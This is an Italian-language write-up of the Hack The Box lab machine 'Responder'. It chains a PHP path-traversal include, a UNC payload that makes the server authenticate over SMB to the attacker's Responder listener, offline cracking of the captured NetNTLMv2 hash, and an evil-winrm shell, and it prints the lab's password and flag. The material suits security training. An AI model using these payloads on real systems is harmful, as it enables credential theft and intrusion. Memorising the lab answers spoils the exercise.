# HTB Starting Point — Responder

**Platform:** Hack The Box — Starting Point Tier 1  
**OS:** Windows  
**Difficulty:** Very Easy  
**Focus:** LFI → NTLM hash capture via Responder → hash cracking → WinRM access

> **Note:** Box completata con riferimento al writeup ufficiale. Appunti personali, non per pubblicazione.

---

## Summary

Responder è una box Windows che combina tre vulnerabilità in catena: un'applicazione PHP vulnerabile a Local/Remote File Inclusion, una misconfiguration che permette connessioni SMB verso host arbitrari, e credenziali deboli crackabili con dizionario. Il risultato è una shell privilegiata via WinRM.

---

## Reconnaissance

### Nmap

```bash
nmap -p- --min-rate 1000 -sV 10.129.95.234
```

**Risultati chiave:**

- `80/tcp` — Apache 2.4.52 (Win64), PHP 8.1.1 (XAMPP)
- `5985/tcp` — WinRM (Microsoft HTTPAPI 2.0)

**Osservazioni:**

- OS Windows confermato dal banner Apache (Win64)
- WinRM su 5985 → se troviamo credenziali, abbiamo una shell PowerShell remota
- Nessun SSH, nessun RDP esposto

---

## Web Enumeration

Aprendo `http://10.129.95.234` nel browser, il sito redirige automaticamente su `http://unika.htb` — virtual hosting basato sul campo `Host` dell'header HTTP.

### Fix /etc/hosts

```bash
echo "10.129.95.234 unika.htb" | sudo tee -a /etc/hosts
```

Il sito è una landing page di web design chiamata "UNIKA". Navigando tra le lingue (EN → FR) si nota che l'URL cambia:

```
http://unika.htb/index.php?page=french.html
```

Il parametro `page` carica file dinamicamente — candidato immediato per LFI.

---

## LFI (Local File Inclusion)

### Verifica vulnerabilità

Il backend usa `include()` di PHP sul parametro `page` senza sanitizzazione. Test con path traversal verso un file noto su Windows:

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

**Risultato:** contenuto del file `C:\windows\system32\drivers\etc\hosts` visualizzato nella pagina. **LFI confermata.**

### Perché funziona

PHP `include()` accetta path UNC (`\\host\share`) oltre ai path locali. Anche con `allow_url_include = Off`, PHP non blocca i path SMB — questo apre la strada alla cattura dell'hash NTLM.

---

## Responder — NetNTLMv2 Capture

### Setup

Responder è preinstallato su Kali. Identificare l'interfaccia VPN HTB:

```bash
ip a show tun0
# inet 10.10.14.212/23
```

Avviare Responder in ascolto su tun0:

```bash
sudo responder -I tun0
```

Responder attiva un SMB server malevolo. Quando il target si connette, cattura la challenge e la risposta cifrata (NetNTLMv2).

### Trigger via browser

```
http://unika.htb/?page=//10.10.14.212/somefile
```

Il server tenta di aprire il file UNC `\\10.10.14.212\somefile` via SMB. Il browser mostra un errore PHP (permission denied) — normale, l'importante è che la connessione SMB sia partita.

### Hash catturato

Responder intercetta l'autenticazione dell'utente Administrator:

```
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash    : Administrator::RESPONDER:33878a1a1ba9c34a:...
```

---

## Hash Cracking

Salvare l'hash in un file:

```bash
echo "Administrator::RESPONDER:33878a1a1ba9c34a:..." > hash.txt
```

Estrarre rockyou se compresso:

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

Crackare con John the Ripper:

```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

**Risultato:**

```
badminton    (Administrator)
Session completed.
```

John identifica automaticamente il tipo `netntlmv2` e trova la password nel dizionario rockyou.

---

## WinRM Access — Evil-WinRM

Con le credenziali `administrator:badminton` e WinRM su porta 5985:

```bash
evil-winrm -i 10.129.95.234 -u administrator -p badminton
```

Shell ottenuta come Administrator. La flag si trova nella home dell'utente `mike`:

```powershell
type C:\Users\mike\Desktop\flag.txt
```

**Flag:** `ea81b7afddd03efaa0945333ed147fac`

---

## Vulnerability Summary

|Categoria|Dettaglio|
|---|---|
|LFI|Parametro `page` in `index.php` — nessuna sanitizzazione sull'input|
|NTLM Capture|PHP include() accetta path SMB anche con `allow_url_include = Off`|
|Weak Credentials|Password Administrator in rockyou.txt (`badminton`)|
|WinRM|Porta 5985 esposta + credenziali valide = shell remota|

---

## Key Takeaways

- **Virtual hosting** richiede di aggiornare `/etc/hosts` prima di poter navigare il sito
- **LFI → RFI via SMB** è un vettore specifico di Windows: PHP non blocca `\\host\share` anche con `allow_url_include = Off`
- **Responder** non fa poisoning LLMNR/NBT-NS in questo scenario — si limita a fare da SMB server malevolo e catturare la challenge
- **NetNTLMv2 ≠ NTHash** — è una challenge/response string, non un hash diretto. Non è reversibile, ma è crackabile offline con dizionario
- **Evil-WinRM** è lo strumento standard per WinRM su Linux — equivalente funzionale di `psexec`/`winrs` da Windows
- La flag era in `C:\Users\mike\Desktop\` nonostante la shell fosse come Administrator — sempre esplorare le home di tutti gli utenti